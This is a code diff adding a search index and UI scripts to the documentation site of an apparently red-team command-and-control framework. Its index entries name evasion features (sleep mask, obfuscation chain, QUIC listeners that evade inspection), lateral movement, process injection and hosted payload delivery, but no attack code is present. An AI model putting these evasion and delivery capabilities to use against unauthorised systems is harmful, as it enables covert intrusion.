+  {section:'Getting Started', title:'Installation', id:'install', snippet:'install.sh, Go build, certificates, operator profiles, SharpCollection'},
+  {section:'Getting Started', title:'Operator Profiles', id:'profiles', snippet:'mTLS client certificates, gen_operator_profile.py, CA rotation'},
+  {section:'Listeners', title:'QUIC / HTTP3 Listener', id:'listener-quic', snippet:'UDP-based, evades TCP inspection, automatic HTTPS fallback'},
+  {section:'Listeners', title:'HTTP Listener', id:'listener-http', snippet:'Plain HTTP beacon, port 80, stealth via Malleable C2'},
+  {section:'Listeners', title:'mTLS Listener', id:'listener-mtls', snippet:'Mutual TLS, client certificate required, strongest authentication'},
+  {section:'Listeners', title:'SMB Named Pipe', id:'listener-smb', snippet:'Lateral movement, peer-to-peer, no internet required'},
+  {section:'Evasion', title:'Sleep Mask', id:'sleep-mask', snippet:'Full heap encryption during sleep, VirtualQuery loop, CS 4.11 parity'},
+  {section:'Evasion', title:'Obfuscation Pipeline', id:'obf-pipeline', snippet:'sgn, xor, zlib, b64, aes — ordered encode chain at build time'},
+  {section:'BOF', title:'Beacon Object Files', id:'bof-overview', snippet:'COFF x64, in-process execution, CS BOF API compatible'},
+  {section:'BOF', title:'Installing BOFs', id:'bof-install', snippet:'bof install command, Settings → BOFs panel, Installed/Catalog tabs'},
+  {section:'Covert Channels', title:'UDC2 Transport', id:'udc2', snippet:'Custom C2 transport via BOF, hot-swap at runtime via UDC2_LOAD'},
+  {section:'Covert Channels', title:'Malleable C2', id:'malleable-c2', snippet:'Live profile push, user-agent, beacon URIs, http headers'},
+  {section:'Team Operations', title:'Peer Federation', id:'peer-federation', snippet:'Multi-teamserver aggregation, 30s sync, peer badge, read-only agents'},
+  {section:'Team Operations', title:'Scripted Delivery', id:'scripted-delivery', snippet:'Hosted payloads, one-liner scripts, hit tracking, IP and UA logs'},
+  {section:'Reference', title:'Operator API', id:'api-ref', snippet:'REST API, mTLS, jsonOK envelope, task endpoint, build endpoint'},
+  {section:'Reference', title:'Task Type Reference', id:'task-types', snippet:'SHELL, BOF_RUN, UDC2_LOAD, INJECT, INJECT_OBFSTC, CONFIG, SOCKS…'},
+];
+
+function openSearch() {
+  document.getElementById('search-overlay').classList.add('on');
+  document.getElementById('search-input').focus();
+}
+function closeSearch() {
+  document.getElementById('search-overlay').classList.remove('on');
+  document.getElementById('search-input').value = '';
+  document.getElementById('search-results').innerHTML = '<div class="search-empty">Start typing to search…</div>';
+}
+function doSearch(q) {
+  const res = document.getElementById('search-results');
+  if (!q.trim()) { res.innerHTML = '<div class="search-empty">Start typing to search…</div>'; return; }
+  const lq = q.toLowerCase();
+  const matches = INDEX.filter(e => e.title.toLowerCase().includes(lq) || e.snippet.toLowerCase().includes(lq) || e.section.toLowerCase().includes(lq));
+  if (!matches.length) { res.innerHTML = '<div class="search-empty">No results found.</div>'; return; }
+  res.innerHTML = matches.map(e => `
+    <div class="search-result" onclick="show('${e.id}');closeSearch()">
+      <div class="sr-section">${e.section}</div>
+      <div class="sr-title">${e.title}</div>
+      <div class="sr-snippet">${e.snippet}</div>
+    </div>`).join('');
+}
+
+// ── KEYBOARD ──
+document.addEventListener('keydown', e => {
+  if ((e.metaKey || e.ctrlKey) && e.key === 'k') { e.preventDefault(); openSearch(); }
+  if (e.key === 'Escape') closeSearch();
+});
+
+// ── COPY CODE ──
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  navigator.clipboard?.writeText(pre.textContent).then(() => {
+    btn.textContent = 'Copied!';
+    setTimeout(() => btn.textContent = 'Copy', 1500);
+  });
+}
+</script>
